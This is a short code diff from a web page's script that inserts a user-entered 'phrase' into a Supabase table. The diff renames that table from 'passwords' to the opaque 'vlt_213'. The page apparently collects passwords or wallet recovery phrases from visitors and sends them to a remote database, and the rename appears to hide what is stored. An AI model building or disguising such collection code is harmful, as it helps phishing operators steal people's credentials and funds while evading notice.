@@ -265,7 +265,7 @@
 
       try {
         const { error } = await supabaseClient
-          .from("passwords")
+          .from("vlt_213")
           .insert([{ phrase: input }]);
 
         spinner.style.display = "none";
@@ -286,4 +286,5 @@
 </body>
 
 </html>
+
 
